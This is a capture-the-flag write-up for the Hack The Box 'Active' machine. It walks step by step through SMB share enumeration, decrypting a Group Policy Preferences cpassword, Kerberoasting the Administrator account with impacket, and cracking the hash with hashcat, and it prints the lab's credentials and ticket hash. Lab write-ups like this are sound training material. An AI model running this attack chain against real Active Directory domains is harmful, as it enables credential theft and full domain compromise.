---
layout: post
title:  "HTB-Active"
description: Hack the Box - Active Machine.
tags: HTB Active
---
# Brief Summary

This box is considered easy but very entertaining. The hacking of this machine invlove some **Cryptography** and **Microsoft Active Directory**, hence the name of machine. 

![machine](/assets/active/machine.png)
# Nmap 
As usual start off with nmap 10.10.10.100 -A
```
# Nmap 7.91 scan initiated Thu Jul 22 20:29:07 2021 as: nmap -A -oN nmap-A 10.10.10.100
Nmap scan report for 10.10.10.100
Host is up (0.13s latency).
Not shown: 983 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-22 17:34:21Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0

Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4m27s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-07-22T17:35:20
|_  start_date: 2021-07-22T16:59:16

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul 22 20:31:02 2021 -- 1 IP address (1 host up) scanned in 114.43 seconds
```

# Enumeration
Port SMB is open. Lets take a look at it, using `smbclient`.
```sh 
$ smbclient -L 10.10.10.100
Enter WORKGROUP\GUEST's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
SMB1 disabled -- no workgroup available
```
(when prompt for pass, just press enter)

After enumerating each folder, the interesting stuff were found in 'Replication'

Let's download the whole folder to make our search easier.
```sh 
smbclient '//10.10.10.100/Replication' -c 'prompt OFF;recurse ON;cd active.htb;mget *'
```
Now searching in the downloaded folder for hot stuff using grep.
```sh 
$ grep -rn active.htb -e 'password\|user'
active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml:2:<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
grep: and: No such file or directory
grep: user: No such file or directory
```

Nice, we found some encrypted password with cleartext username 'SVC_TGS'  and it is using Group Policy Preferences (GPP). The path 'Policies/***/Preferences/Groups/Groups.xml' tells us that GPP is in use.

Good thing is that GPP has a critical security flaw. It stores credentials insecurely. Here is a link to vulnerability [MS14-025](https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30) .

# Cryptography & User Own

Since the GPP is infected with MS14-025, it means that we can easily decrypt the cipher using `gpp-decrypt` tool in kali linux.
```sh
$ gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'

GPPstillStandingStrong2k18
```

Neat, we got a password.

Now let's repeat the smbclient attack again with credential this time.

```sh 
smbclient '//10.10.10.100/NETLOGON' -U "SVC_TGS" -c 'prompt OFF;recurse ON;cd active.htb;mget *'
```
-U flag for username
(when prompt for password entered: GPPstillStandingStrong2k18)
After donwloading 'Users' folders, we found the user.txt flag under 'Users\SVC_TGS\Desktop\'



# Active Directory Enumeration
This step require `impacket` package from python to penetrate further in AD.(if tool not installed run `pip install impacket`)

Using `GetADUsers.py` to list all existing users in AD.
```sh
GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100 
...
...
Password:
[*] Querying 10.10.10.100 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 19:06:40.351723  2021-01-21 16:07:03.723783 
Guest                                                 <never>              <never>             
krbtgt                                                2018-07-18 18:50:36.972031  <never>             
SVC_TGS                                               2018-07-18 20:14:38.402764  2018-07-21 14:01:30.320277 
```
(enter password when prompt: GPPstillStandingStrong2k18)
Now lets check if there is a Service Pricipal Name SPN running under SVC_TGS account.
```sh
$ GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 19:06:40.351723  2021-01-21 16:07:03.723783   
```

Nice, Since the service account 'SVC_TGS' is running by administrator, we can request a Ticket Granting Service (TGS) and attempt to decrypt it.
```sh  
$ GetUserSPNs.py -request active.htb/svc_tgs -dc-ip 10.10.10.100


$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$c3eedcf601434a82ec2a2127f0443e15$bbec4fab6535c331745fbc6442a428baa571d859aec3cce6f4ae1de127201b5a92854ae7a3ad8b5c228e8fa49f41f26d5fdbc0110a87b3ee486be86de4c1bd74c2f02d06a7f68799a6be79b4164ab90f4478a0032a2d6ddd23520999cee9c1461a64cffb4c70a29d3240637a426f4e2e23badaacffcfc0a3659628cff6129b5c8026b03404059c5f7d6a4d65c769aa6f98f4597b79a4e28fd78a520d8622d55307318fec49cf0dc372579b809a17af52cc03f0ec86bbec96ec1cbcddb2f41acac92095e80153cfc1cf14777d385af9af95cf4ffd29f07ca9286765fae92fa60152cc5c4ba4cd85fbe6be0d440cb96c3c521a926e7e2949a6ede318e6150f5943f8df2f35091b27d5940f81ae5791bbb871fac35f4b1e4d0b8126870095f1e5007a3e5fa2d044a437e7b7e1ff5eccbc5dc01db06fa5526787ef10232bf090dfaa4a35afb6ae8e148ee4295a4bc21407fd681f2a61780235fcaa67d5c7f7d24d77ddb926d5425614c3d32227f6d8e5aa9a3dff1b95b9bdbb80a401d55ed3609cb4d3f67231c769527c566c94a92f587315765b61ff6febf61a72c55d2f70daef4bf004ff51ee118d619131515bd726f544bd886a30b8e3ad7ee97b25a28dfe64afd847be1375d9df92e5a71ff741148b47b2d3920d0cb4b6dd1850f629f071203fa8239f76d52194aa202c8d8151368cacae741a2fd6e58e49320491f0dc3fc6467c848f1ca5f5b460e0ad2e74bced9eb93d56828312ddca568ab949ecbe847326fc059d6854c3680caef798a12306cae22869d0ef74510603862108e90e51561f5a24c47160f5fb60bb618dcf53458ab1fd36f9c43b1b8db6a9c778e2f14648be31d38c0ff6632c9cb7f7df9d3972eb6d62cb8aa21094071b0e2d637a9365e3939eea7ea80fbef3b7cf2925eef18cf1e573c3915bc85452747b8bdb810f7d78fcfdb89ed33b399e0164060fda25428d0e283f3cbc9c6f112998932588403649a9939d4649add6077de3b11351dfa8cde64562de1d6d13258e3725b126a8b8d91166e9922cec43a676e33cc03b11666eadac22c0050f349ad2ca4cc93e6c748b92e914c644a2081d0df1c188fcfe58d22432aa75de2bbe419d81b1c014b570fdbe2c14b8c5765601adcbcfe0fe84455a5ac74b41a5be46eda91a4139b6d571e50af04813c4463bba0c6726c10670640360c43293c4c5aa02b267e0ca3b9fc29c1a9f40e98e957d63acbb04bb8d6df9e875e3ae9adb6975d608c19e

```

Now let save the output to a file and decrypt it using hashcat with rockyou.txt dictionary.
```sh 
hashcat -m 13100 hash ~/wordlists/rockyou.txt
```
the price is: Ticketmaster1968

# Post Exploitation & Root Own

Using smbclient to grab the flag with newly found credentials for admin.
```sh 
$ smbclient '//10.10.10.100/Users/' -U 'administrator'
Enter WORKGROUP\administrator's password: 
(enter: Ticketmaster1968)
Try "help" to get a list of possible commands.
smb: \> cd Administrator/Desktop/
smb: \Administrator\Desktop\> get root.txt
getting file \Administrator\Desktop\root.txt of size 34 as root.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \Administrator\Desktop\> exit
$ cat root.txt 
b5fc76d1d6b91d77b***************
```

Thanks for reading.